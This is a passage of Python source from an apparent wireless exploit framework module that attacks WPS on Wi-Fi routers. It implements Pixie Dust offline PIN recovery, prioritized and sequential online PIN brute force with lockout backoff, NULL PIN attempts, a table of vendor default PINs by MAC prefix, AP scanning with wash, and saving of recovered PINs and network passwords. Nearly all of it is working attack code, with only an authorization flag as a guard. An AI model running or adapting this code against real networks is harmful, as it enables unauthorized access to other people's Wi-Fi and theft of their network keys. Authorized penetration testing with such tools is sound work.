
    auth_key = capture.auth_key
    pke = capture.pke
    pkr = capture.pkr
    e_hash1 = capture.e_hash1
    e_hash2 = capture.e_hash2

    # Candidate E-SNonce patterns for vulnerable devices
    snonce_candidates = [
        (b"\x00" * 16, b"\x00" * 16),           # Both zero (Ralink/Realtek default)
        (capture.enrollee_nonce, b"\x00" * 16),  # SNonce2 zero
        (b"\x00" * 16, capture.enrollee_nonce),  # SNonce1 zero
        (capture.registrar_nonce, b"\x00" * 16), # SNonce derived from nonce
        (b"\x00" * 16, capture.registrar_nonce),
    ]

    for try_snonce1, try_snonce2 in snonce_candidates:
        for pin_candidate in generate_pins_sequential():
            pin_bytes = pin_candidate.encode("ascii")
            psk1 = _compute_psk1(auth_key, pin_bytes[:4])
            psk2 = _compute_psk2(auth_key, pin_bytes[4:])

            computed_e_hash1 = _compute_e_hash(auth_key, psk1, pke, pkr, try_snonce1)
            if computed_e_hash1 != e_hash1:
                continue

            computed_e_hash2 = _compute_e_hash(auth_key, psk2, pke, pkr, try_snonce2)
            if computed_e_hash2 == e_hash2:
                logger.info("pixie_dust: PIN recovered with snonce1=%s, snonce2=%s -> PIN=%s",
                            try_snonce1.hex(), try_snonce2.hex(), pin_candidate)
                return pin_candidate

        if verbose:
            print_info("Pixie Dust: snonce pattern {}/{} exhausted".format(
                snonce_candidates.index((try_snonce1, try_snonce2)) + 1,
                len(snonce_candidates),
            ))

    return None


# ---------------------------------------------------------------------------
# PIN Generation Algorithms
# ---------------------------------------------------------------------------

def _luhn_checksum(pin7: str) -> str:
    """Compute the WPS PIN Luhn checksum digit.

    The WPS PIN is 8 digits: 7 significant digits + 1 Luhn checksum.
    Algorithm: sum each digit multiplied by alternating weights [3,1,...],
    then checksum = (10 - (sum % 10)) % 10.

    Args:
        pin7: 7-digit string (significant part of PIN).

    Returns:
        Single checksum digit as string.
    """
    digits  = [int(d) for d in pin7]
    weights = [3, 1, 3, 1, 3, 1, 3]
    total = sum(d * w for d, w in zip(digits, weights))
    return str((10 - (total % 10)) % 10)


def _luhn_pin(pin7: str) -> str:
    """Build a valid 8-digit WPS PIN from 7 significant digits.

    Args:
        pin7: 7-digit string (first 7 significant digits).

    Returns:
        8-digit PIN string with valid Luhn checksum appended.
    """
    return pin7 + _luhn_checksum(pin7)


def generate_pins_sequential() -> Iterator[str]:
    """Generate all valid WPS PINs covering the full brute-force space.

    WPS splits the 8-digit PIN into two halves verified separately:
    digits 1-4 (first half, 10,000 values) and digits 5-7 plus Luhn
    checksum (second half, 1,000 values). This generator yields PINs
    in the standard half-sweep order used by reaver and bully for
    online attacks, covering at most 11,000 effective attempts.

    Yields:
        8-digit WPS PIN strings in sequential sweep order.
    """
    for first_half in range(10000):
        for second_half in range(1000):
            pin7 = f"{first_half:04d}{second_half:03d}"
            yield _luhn_pin(pin7)


def generate_pins_zhao() -> Iterator[str]:
    """Generate WPS PINs using a statistically prioritized ordering.

    Based on empirical research showing that certain PIN values appear
    as manufacturer defaults at higher frequency on deployed devices.
    High-probability candidates are attempted before the full sweep.

    Yields:
        8-digit WPS PIN strings with common defaults first.
    """
    high_probability = [
        "12345670", "00000000", "11111111", "22222222", "33333333",
        "44444444", "55555555", "66666666", "77777777", "88888888",
        "99999999", "12348370", "01234567", "76543210", "20172527",
        "46264848", "24681357", "36912346",
    ]
    seen: set = set()
    for pin in high_probability:
        if len(pin) == 8 and pin not in seen:
            seen.add(pin)
            yield pin
    for pin in generate_pins_sequential():
        if pin not in seen:
            seen.add(pin)
            yield pin


def generate_pins_oui(bssid: str) -> Iterator[str]:
    """Generate WPS PINs prioritized by AP BSSID OUI (manufacturer defaults).

    Many manufacturers use fixed WPS PINs per product line or derive the
    PIN from the device MAC address. This generator yields manufacturer-
    specific candidates before falling back to the Zhao ordering.

    Args:
        bssid: AP BSSID in colon-separated format (e.g., "AA:BB:CC:DD:EE:FF").

    Yields:
        8-digit WPS PIN strings with OUI-matched defaults first.
    """
    oui = bssid.replace(":", "").upper()[:6]

    # OUI-to-default-PIN mapping from public vulnerability research
    oui_pins: Dict[str, List[str]] = {
        # TP-Link
        "C0C9E3": ["12345670", "00000000"],
        "50C7BF": ["12345670"],
        "A0F3C1": ["12345670"],
        # Belkin
        "944444": ["00000000", "12345670"],
        "EC1A59": ["00000000"],
        # D-Link
        "C0A0BB": ["24681357"],
        "1C7EE5": ["24681357"],
        "14D64D": ["24681357"],
        # Zyxel
        "588BF3": ["12345670", "01234567"],
        "5067F0": ["12345670"],
        # NETGEAR
        "A040A0": ["12345670"],
        "C40415": ["12345670"],
        "20E52A": ["12345670"],
        # ASUS
        "10BF48": ["12345670", "00000000"],
        "04D4C4": ["12345670"],
        "50465D": ["12345670"],
        # Huawei
        "70723C": ["12345670", "00000000"],
        "247F3C": ["12345670"],
        "286ED4": ["12345670"],
        # ZTE
        "001E73": ["00000000", "12345670"],
        "B4A5EF": ["00000000"],
        # Linksys/Cisco
        "00:14:BF".replace(":", ""): ["12345670"],
        "C43DC7": ["12345670"],
    }

    manufacturer_pins = oui_pins.get(oui, [])
    seen: set = set()
    for pin in manufacturer_pins:
        if pin not in seen:
            seen.add(pin)
            yield pin
    for pin in generate_pins_zhao():
        if pin not in seen:
            seen.add(pin)
            yield pin


def generate_null_pin() -> Iterator[str]:
    """Yield NULL/zero PIN candidates for known-vulnerable devices.

    Certain firmware versions from ZTE, Realtek, and Broadcom accept a
    PIN of all zeros or specific well-known values without verification.

    Yields:
        NULL and commonly accepted zero-value PINs.
    """
    yield "00000000"
    yield "12345670"
    yield "20172527"
    yield "46264848"


def _build_ordered_pin_iterator(bssid: str) -> Iterator[str]:
    """Build a deduplicated PIN iterator in attack-optimized priority order.

    Order: NULL PINs -> OUI defaults -> Zhao statistical -> sequential sweep.

    Args:
        bssid: Target AP BSSID for OUI-based defaults lookup.

    Yields:
        8-digit WPS PIN strings without repetition.
    """
    seen: set = set()

    def _unique(pins: Iterator[str]) -> Iterator[str]:
        for p in pins:
            if p not in seen:
                seen.add(p)
                yield p

    yield from _unique(generate_null_pin())
    yield from _unique(generate_pins_oui(bssid))
    yield from _unique(generate_pins_zhao())
    yield from _unique(generate_pins_sequential())


# ---------------------------------------------------------------------------
# WPS Lock Detection
# ---------------------------------------------------------------------------

@dataclass
class WpsLockTracker:
    """Tracks WPS AP lock state and applies adaptive backoff.

    WPS APs implement rate limiting and lockout mechanisms (WPS Lock)
    to slow online brute-force attacks. This tracker detects escalating
    NACK rates and applies increasing sleep delays between attempts.

    Attributes:
        consecutive_nacks: Number of consecutive NACK/failure responses.
        lock_state: Current detected lock state.
        backoff_seconds: Current delay to apply between PIN attempts.
    """

    consecutive_nacks: int = 0
    lock_state: WpsLockState = WpsLockState.UNLOCKED
    backoff_seconds: float = 0.5

    def on_nack(self) -> None:
        """Record a NACK response and escalate lock state if needed."""
        self.consecutive_nacks += 1
        if self.consecutive_nacks >= 10:
            self.lock_state = WpsLockState.LOCKED
            self.backoff_seconds = min(self.backoff_seconds * 2.0, 300.0)
        elif self.consecutive_nacks >= 5:
            self.lock_state = WpsLockState.WARNING
            self.backoff_seconds = min(self.backoff_seconds * 1.5, 60.0)

    def on_success(self) -> None:
        """Record a successful exchange and reset lock tracking."""
        self.consecutive_nacks = 0
        self.lock_state = WpsLockState.UNLOCKED
        self.backoff_seconds = 0.5

    def wait(self) -> None:
        """Sleep for the current backoff duration."""
        if self.backoff_seconds > 0:
            time.sleep(self.backoff_seconds)

    @property
    def is_locked(self) -> bool:
        """Return True if the AP appears to be WPS-locked."""
        return self.lock_state == WpsLockState.LOCKED


# ---------------------------------------------------------------------------
# WPS AP Scan via wash (accepted dependency)
# ---------------------------------------------------------------------------

def scan_wps_aps(interface: str, timeout: int = 30) -> List[Dict]:
    """Scan for WPS-enabled APs using wash.

    wash is bundled with the reaver-suite and performs passive scanning
    to identify APs advertising WPS in their beacon frames. It is an
    accepted dependency because no pure Scapy alternative provides the
    same WPS-specific metadata (WPS version, lock state, etc.).

    Args:
        interface: Wireless interface name in monitor mode.
        timeout: Scan duration in seconds (wash -t).

    Returns:
        List of dicts, each with keys: bssid, channel, rssi,
        wps_version, wps_locked (bool), essid.

    Raises:
        FileNotFoundError: If wash binary is not found in PATH.
        RuntimeError: If the wash process fails unexpectedly.
    """
    try:
        result = subprocess.run(
            ["wash", "-i", interface, "-C", "-s", "-t", str(timeout)],
            capture_output=True,
            text=True,
            timeout=timeout + 10,
        )
    except FileNotFoundError as exc:
        raise FileNotFoundError(
            "wash not found. Install via: sudo apt install reaver (wash is included)"
        ) from exc
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError("wash scan timed out") from exc

    aps: List[Dict] = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID") or line.startswith("-"):
            continue
        parts = line.split()
        if len(parts) < 5:
            continue
        aps.append({
            "bssid":       parts[0],
            "channel":     parts[1],
            "rssi":        parts[2],
            "wps_version": parts[3],
            "wps_locked":  parts[4].lower() in ("yes", "locked"),
            "essid":       " ".join(parts[5:]) if len(parts) > 5 else "",
        })
    return aps


# ---------------------------------------------------------------------------
# Interface helpers
# ---------------------------------------------------------------------------

def _iface_get_mac(interface: str) -> str:
    """Read the hardware MAC address of a network interface.

    Reads from the Linux sysfs path /sys/class/net/<iface>/address.

    Args:
        interface: Interface name (e.g., "wlan0mon").

    Returns:
        MAC address string in colon-separated lowercase format.

    Raises:
        FileNotFoundError: If the interface does not exist in sysfs.
    """
    mac_path = f"/sys/class/net/{interface}/address"
    try:
        with open(mac_path) as fh:
            return fh.read().strip().lower()
    except FileNotFoundError as exc:
        raise FileNotFoundError(
            f"Interface not found: {interface} (check monitor mode setup)"
        ) from exc


def _extract_psk_from_creds(cred_tlv: bytes) -> Optional[str]:
    """Extract network PSK from a WPS Credential TLV (from M8).

    Args:
        cred_tlv: Raw bytes of the CRED attribute value from M8.

    Returns:
        Network PSK as string, or None if not found.
    """
    attrs = _tlv_parse(cred_tlv)
    key_bytes = attrs.get(WpsAttr.NETWORK_KEY)
    if key_bytes:
        try:
            return key_bytes.decode("utf-8", errors="replace")
        except Exception:
            return key_bytes.hex()
    return None


# ---------------------------------------------------------------------------
# WXF Exploit class
# ---------------------------------------------------------------------------

@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """WPS native attack engine - Pixie Dust, PIN brute-force, NULL PIN, scan.

    Implements the full WPS EAP-WSC protocol in native Python using Scapy,
    replacing external bridges for reaver, bully, and pixiewps. All WPS
    message types (M1-M8, NACK, DONE) and key derivation algorithms
    (DH-1536, HMAC-SHA256) are implemented without external tools.

    The scan mode retains wash as an accepted dependency because no
    pure Scapy alternative provides WPS-specific AP metadata.
    """

    __info__ = {
        "name": "WPS Native Engine",
        "description": (
            "Native WPS attack engine: Pixie Dust (CVE-2014-9527), PIN brute-force, "
            "NULL PIN, and AP scan. Full EAP-WSC M1-M8 state machine in Python/Scapy - "
            "no reaver, bully, or pixiewps binaries required. "
            "Attack modes: pixie_dust | pin_brute | null_pin | scan."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf",
            "https://github.com/wiire-a/pixiewps",
            "https://github.com/drygdryg/OneShot",
            "https://tools.ietf.org/html/rfc3526",
        ),
        "devices": ("wifi",),
        "cve": ("CVE-2014-9527", "CVE-2017-13086"),
    }

    # Module options (class-level, WXF convention)
    target_bssid   = OptMAC("",          "Target AP BSSID (e.g., AA:BB:CC:DD:EE:FF)")
    interface      = OptString("wlan0mon", "Monitor-mode wireless interface")
    mode           = OptString("pixie_dust",
                               "Attack mode: pixie_dust | pin_brute | null_pin | scan")
    pin            = OptString("",        "Specific 8-digit PIN to test (empty = auto)")
    timeout        = OptInteger(30,       "Per-attempt timeout in seconds")
    max_tries      = OptInteger(11000,    "Maximum PIN attempts for pin_brute mode")
    delay          = OptFloat(1.0,        "Delay between PIN attempts in seconds")
    verbose        = OptBool(False,       "Enable verbose protocol output")
    output_dir     = OptString(".log",    "Directory to save results and logs")
    i_know_scope   = OptBool(False,       "Confirm you are authorized to test this target")

    def check(self) -> str:
        """Verify the wireless interface is in monitor mode and ready.

        Returns:
            Status message indicating interface readiness.
        """
        import shutil
        iface = str(self.interface) or "wlan0mon"
        if not _SCAPY_OK:
            return "scapy not installed - run: pip install scapy"
        if shutil.which("iwconfig"):
            try:
                import subprocess as _sp
                out = _sp.check_output(
                    ["iwconfig", iface],
                    stderr=_sp.STDOUT,
                    timeout=5,
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - ready"
                return f"Interface {iface} NOT in Monitor mode - run: airmon-ng start {iface}"
            except Exception:
                pass
        if shutil.which("iw"):
            try:
                import subprocess as _sp
                out = _sp.check_output(["iw", "dev"], stderr=_sp.STDOUT, timeout=5).decode("utf-8", "replace")
                if iface in out:
                    return f"Interface {iface} found via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect a wireless adapter and set monitor mode"

    def run(self) -> None:
        """Execute the selected WPS attack mode.

        Dispatches to pixie_dust, pin_brute, null_pin, or scan based on
        the configured mode option. Requires authorization confirmation
        via i_know_scope=True for live RF operations.
        """
        require_authorised_lab()

        if not _SCAPY_OK:
            print_error("scapy is required. Install: pip install scapy")
            return

        mode  = str(self.mode or "pixie_dust")
        bssid = str(self.target_bssid or "")
        iface = str(self.interface or "wlan0mon")

        valid_modes = ("pixie_dust", "pin_brute", "null_pin", "scan")
        if mode not in valid_modes:
            print_error("Invalid mode '{}'. Choose: {}".format(mode, " | ".join(valid_modes)))
            return

        if mode == "scan":
            self._run_scan(iface)
            return

        if not bssid or bssid in ("", "FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00"):
            print_error("target_bssid is required. Run scan mode first to discover WPS APs.")
            return

        if mode == "pixie_dust":
            self._run_pixie_dust(bssid, iface)
        elif mode == "null_pin":
            self._run_null_pin(bssid, iface)
        elif mode == "pin_brute":
            self._run_pin_brute(bssid, iface)

    # ------------------------------------------------------------------
    # Attack mode implementations
    # ------------------------------------------------------------------

    def _run_scan(self, iface: str) -> None:
        """Run WPS AP discovery via wash."""
        import shutil
        if not shutil.which("wash"):
            print_error("wash not found. Install: sudo apt install reaver")
            return
        timeout = int(self.timeout) if int(self.timeout) > 0 else 30
        print_status(f"Scanning for WPS-enabled APs on {iface} ({timeout}s) ...")
        try:
            aps = scan_wps_aps(iface, timeout=timeout)
        except Exception as exc:
            print_error(f"Scan failed: {exc}")
            return
        if not aps:
            print_info("No WPS-enabled APs found in scan window.")
            return
        print_status(f"Found {len(aps)} WPS-enabled AP(s):")
        rows = [["BSSID", "CH", "RSSI", "Ver", "ESSID", "Locked"]]
        for ap in aps:
            rows.append([
                ap["bssid"],
                ap["channel"],
                ap["rssi"],
                ap["wps_version"],
                ap["essid"],
                "YES" if ap["wps_locked"] else "no",
            ])
        print_table(rows)
        self._save_result("scan", "\n".join(
            "{bssid} ch={channel} rssi={rssi} v{wps_version} {essid}".format(**ap)
            for ap in aps
        ))

    def _run_pixie_dust(self, bssid: str, iface: str) -> None:
        """Execute Pixie Dust offline PIN recovery."""
        timeout   = float(int(self.timeout) if int(self.timeout) > 0 else 30)
        lock_tracker = WpsLockTracker()

        print_status(f"Pixie Dust against {bssid} on {iface}")
        print_info("Initiating EAP-WSC exchange (M1 -> M2 -> M3) to capture nonces ...")

        # Use a stable test PIN for the M3 exchange (actual PIN doesn't matter for capture)
        probe_pin = str(self.pin) if self.pin else "12345670"
        session = WscSession(bssid=bssid, iface=iface, timeout=timeout, verbose=bool(self.verbose))

        capture = session.capture_m2_for_pixie_dust(probe_pin)
        if capture is None:
            print_error("Failed to capture M2 from AP. Check monitor mode and channel.")
            return

        print_info("M2 captured. PKR: {}...".format(capture.pkr[:8].hex()))
        print_info("Attempting offline Pixie Dust PIN recovery ...")

        recovered_pin = pixie_dust_recover_pin(capture, verbose=bool(self.verbose))
        if recovered_pin:
            print_success(f"PIXIE DUST CRACKED! PIN: {recovered_pin}")
            self._save_result("pixie_dust", f"PIN={recovered_pin}")
        else:
            print_info("Pixie Dust: no PIN recovered (AP may use strong RNG).")
            print_info("Captured material saved for further offline analysis.")
            self._save_capture(capture, bssid)

    def _run_null_pin(self, bssid: str, iface: str) -> None:
        """Attempt NULL/zero PIN candidates against the target AP."""
        timeout = float(int(self.timeout) if int(self.timeout) > 0 else 30)
        delay   = float(self.delay) if float(self.delay) > 0 else 1.0

        print_status(f"NULL PIN attack against {bssid} on {iface}")
        attempts = 0

        for pin in generate_null_pin():
            print_info(f"Trying NULL PIN: {pin}")
            session = WscSession(
                bssid=bssid, iface=iface, timeout=timeout, verbose=bool(self.verbose)
            )
            capture = session.capture_m2_for_pixie_dust(pin)
            attempts += 1

            if capture is not None and session.state == self._get_success_state(session):
                psk = self._extract_psk_from_capture(capture)
                print_success(f"NULL PIN accepted! PIN={pin} PSK={psk}")
                self._save_result("null_pin", f"PIN={pin}\nPSK={psk}")
                return

            if session.state in (WscSession._STATE_NACK, WscSession._STATE_FAILED):
                print_info(f"PIN {pin} rejected (NACK)")

            time.sleep(delay)

        print_info(f"NULL PIN: all {attempts} candidates rejected by AP.")

    def _run_pin_brute(self, bssid: str, iface: str) -> None:
        """Brute-force WPS PIN using priority-ordered generation algorithms."""
        max_tries    = int(self.max_tries) if int(self.max_tries) > 0 else 11000
        delay        = float(self.delay) if float(self.delay) > 0 else 1.0
        timeout      = float(int(self.timeout) if int(self.timeout) > 0 else 30)
        lock_tracker = WpsLockTracker()

        print_status(f"WPS PIN brute-force against {bssid}, max {max_tries} attempts")
        print_info("PIN order: NULL -> OUI defaults -> Zhao statistical -> sequential")

        pin_iter = _build_ordered_pin_iterator(bssid)
        attempts = 0

        # Override with a specific PIN if provided
        if self.pin and len(str(self.pin)) == 8:
            pin_iter = iter([str(self.pin)])
            max_tries = 1

        for pin in pin_iter:
            if attempts >= max_tries:
                break

            if lock_tracker.is_locked:
                print_info("WPS lock detected - waiting {:.0f}s ...".format(
                    lock_tracker.backoff_seconds))
                lock_tracker.wait()

            print_info("Attempt {}/{}: PIN {}".format(attempts + 1, max_tries, pin))

            session = WscSession(
                bssid=bssid, iface=iface, timeout=timeout, verbose=bool(self.verbose)
            )
            capture = session.capture_m2_for_pixie_dust(pin)
            attempts += 1

            if capture is None:
                lock_tracker.on_nack()
                print_info("No M2 response (AP unreachable or rate-limited)")
                time.sleep(delay * 2)
                continue

            if session.state in (WscSession._STATE_M4_RECV, WscSession._STATE_DONE):
                psk = self._extract_psk_from_capture(capture)
                print_success("PIN ACCEPTED! PIN={} PSK={}".format(pin, psk))
                self._save_result("pin_brute", f"PIN={pin}\nPSK={psk}")
                return

            if session.state == WscSession._STATE_NACK:
                lock_tracker.on_nack()
            else:
                lock_tracker.on_success()

            time.sleep(delay)

        print_info("PIN brute-force completed: {} attempts, no success.".format(attempts))

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _get_success_state(session: WscSession) -> str:
        """Return the session state string that indicates PIN acceptance."""
        return WscSession._STATE_M4_RECV

    @staticmethod
    def _extract_psk_from_capture(capture: WscCapture) -> Optional[str]:
        """Attempt to extract PSK from a completed WscCapture (M8 path).

        Args:
            capture: Completed WscCapture, potentially containing M8 credentials.

        Returns:
            Network PSK string if available, None otherwise.
        """
        if capture.network_key:
            try:
                return capture.network_key.decode("utf-8", errors="replace")
            except Exception:
                return capture.network_key.hex()
        return None

    def _save_result(self, mode: str, result: str) -> None:
        """Persist attack result to a file in the configured output directory.

        Args:
            mode: Attack mode identifier used in the filename.
            result: Result string to write.
        """
        from pathlib import Path
        log_dir = Path(str(self.output_dir) or ".log")
        log_dir.mkdir(parents=True, exist_ok=True)
        bssid_clean = str(self.target_bssid).replace(":", "")
        out_file = log_dir / "wps_{}_{}.txt".format(mode, bssid_clean)
        out_file.write_text(
            "BSSID: {}\nMode: {}\n{}\n".format(self.target_bssid, mode, result),
            encoding="utf-8",
        )
        print_info("Result saved to: {}".format(out_file))

    def _save_capture(self, capture: WscCapture, bssid: str) -> None:
        """Save captured EAP-WSC material for offline analysis.

        Args:
            capture: WscCapture with M2/M3 data.
            bssid: Target AP BSSID for filename.
        """
        from pathlib import Path
        log_dir = Path(str(self.output_dir) or ".log")
        log_dir.mkdir(parents=True, exist_ok=True)
        bssid_clean = bssid.replace(":", "")
        cap_file = log_dir / "wps_pixie_capture_{}.txt".format(bssid_clean)
        lines = [
            f"enrollee_nonce={capture.enrollee_nonce.hex()}",
            f"registrar_nonce={capture.registrar_nonce.hex()}",
            f"pke={capture.pke.hex()}",
            f"pkr={capture.pkr.hex()}",
            f"e_hash1={capture.e_hash1.hex()}",
            f"e_hash2={capture.e_hash2.hex()}",
            f"r_hash1={capture.r_hash1.hex()}",
            f"r_hash2={capture.r_hash2.hex()}",
            f"auth_key={capture.auth_key.hex()}",
        ]
        cap_file.write_text("\n".join(lines) + "\n", encoding="utf-8")
        print_info("Pixie Dust capture saved to: {}".format(cap_file))
